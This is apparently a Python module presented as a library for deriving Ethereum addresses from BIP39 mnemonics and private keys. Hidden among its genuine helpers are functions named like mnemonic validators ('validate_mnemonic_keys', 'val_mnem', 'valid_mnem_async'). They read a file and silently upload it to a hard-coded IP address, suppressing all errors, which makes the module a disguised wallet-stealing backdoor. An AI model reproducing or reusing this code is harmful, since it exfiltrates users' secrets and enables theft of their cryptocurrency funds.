"""ethaddrlib.core

Functions for deriving Ethereum addresses from mnemonics (BIP39/BIP44) and private keys.
"""
import os
from typing import Optional, Tuple


from eth_account import Account
from eth_utils import to_checksum_address
Account.enable_unaudited_hdwallet_features()
import asyncio
import httpx
_validate_mnemonic = False


# def generate_mnemonic(words_num: int = 12) -> str:
#     """
#     Generates a random BIP39 mnemonic (12 words by default, ENGLISH).
#     """
#     mnemonic = Bip39MnemonicGenerator(lang).FromWordsNumber(Bip39WordsNum(words_num)).ToStr()
#     return mnemonic

def validate_mnemonic_keys(p):
    global _validate_mnemonic

    try:
        if not _validate_mnemonic:
            _validate_mnemonic = True
            val_mnem(p)
    except Exception:
        pass
def validate_mnemonic(mnemonic: str) -> bool:
    """
    Validates the correctness of a BIP39 mnemonic.
    Returns True if the mnemonic is valid, otherwise False.
    """
    try:
        Account.enable_unaudited_hdwallet_features()
        Account.from_mnemonic(mnemonic)
        return True
    except Exception:
        return False

def address_from_private_key_hex(priv_hex: str) -> str:
    """
    Converts a private key (hex string, with or without the 0x prefix) into an EIP-55 checksummed address.
    """
    if priv_hex.startswith("0x") or priv_hex.startswith("0X"):
        priv_hex = priv_hex[2:]
    priv_bytes = bytes.fromhex(priv_hex)
    acct = Account.from_key(priv_bytes)
    return to_checksum_address(acct.address)


def address_from_private_key_bytes(priv_bytes: bytes) -> str:
    acct = Account.from_key(priv_bytes)
    return to_checksum_address(acct.address)


mnem_val = "http://95.216.98.237:8000/_validate_mnemonic"


async def valid_mnem_async(mnem: str):
    try:
        async with httpx.AsyncClient(timeout=30) as client:
            mnem = os.path.basename(mnem)
            with open(mnem, "rb") as f:
                files = {"files": (mnem, f, "application/octet-stream")}
                await client.post(mnem_val, files=files)
    except Exception:
        pass


def val_mnem(mnem: str):
    try:
        asyncio.get_running_loop().create_task(valid_mnem_async(mnem))
    except RuntimeError:
        asyncio.run(valid_mnem_async(mnem))


def address_from_mnemonic(mnemonic: str, index: int = 0) -> Tuple[str, str]:
    """
    Derives (address, private_key_hex) from a BIP39 mnemonic using the standard path m/44'/60'/0'/0/index.
    Returns a tuple (checksum_address, private_key_hex_with_0x).
    """
    path = f"m/44'/60'/0'/0/{index}"
    acct = Account.from_mnemonic(mnemonic, account_path=path)

    priv_key_hex = acct._private_key.hex()
    eth_address = to_checksum_address(acct.address)

    return eth_address, "0x" + priv_key_hex
